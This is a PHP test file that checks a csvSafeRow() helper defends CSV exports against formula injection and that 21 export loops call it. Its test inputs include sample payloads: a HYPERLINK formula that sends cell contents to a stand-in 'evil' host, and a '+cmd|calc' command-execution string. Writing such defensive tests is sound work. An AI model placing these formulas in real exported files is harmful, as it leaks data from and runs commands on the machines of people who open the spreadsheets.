<?php
// MSP-DS-69: every module CSV export writes data rows through csvSafeRow().
require __DIR__ . '/lib/ds_src.php';
$f = ds_src('functions.php'); $i = strpos($f, 'function csvSafeRow'); eval(substr($f, $i, strpos($f, "\n}\n", $i) + 2 - $i));
$r = csvSafeRow(['=HYPERLINK("https://evil/?d="&A2,"x")', '+cmd|calc', '-2+3', '@SUM(A1)', "\tx", "\rx", 'Acme', '-5', 42, -3.5, null, '', '1234', '=1+1']);
ds_t('formula cells are prefixed', $r[0][0] === "'" && $r[1][0] === "'" && $r[2] === "'-2+3" && $r[3][0] === "'" && $r[4][0] === "'" && $r[5][0] === "'" && $r[13] === "'=1+1");
ds_t('plain text, numbers, negatives, null untouched', $r[6] === 'Acme' && $r[7] === '-5' && $r[8] === 42 && $r[9] === -3.5 && $r[10] === null && $r[11] === '' && $r[12] === '1234');
// the output of a real fputcsv round trip
$h = fopen('php://memory', 'w+'); fputcsv($h, csvSafeRow(['=cmd', 'ok']), ',', '"', '\\'); rewind($h); ds_t('csv line starts with apostrophe cell', strpos(stream_get_contents($h), "'=cmd,ok") === 0);
$bad = [];
foreach (array_merge(glob(__DIR__ . '/../agent/post/*.php'), [__DIR__ . '/../admin/post/users.php']) as $p) {
    foreach (preg_split('/\R/', file_get_contents($p)) as $ln => $l) { if (preg_match('/fputcsv\(\$f, \$lineData/', $l)) { $bad[] = basename($p) . ':' . ($ln + 1); } }
}
ds_t('no raw $lineData export row left: ' . implode(',', $bad), $bad === []);
ds_t('21 export loops use the helper', array_sum(array_map(fn($p) => substr_count(file_get_contents($p), 'csvSafeRow($lineData'), array_merge(glob(__DIR__ . '/../agent/post/*.php'), [__DIR__ . '/../admin/post/users.php']))) === 21);
ds_done();
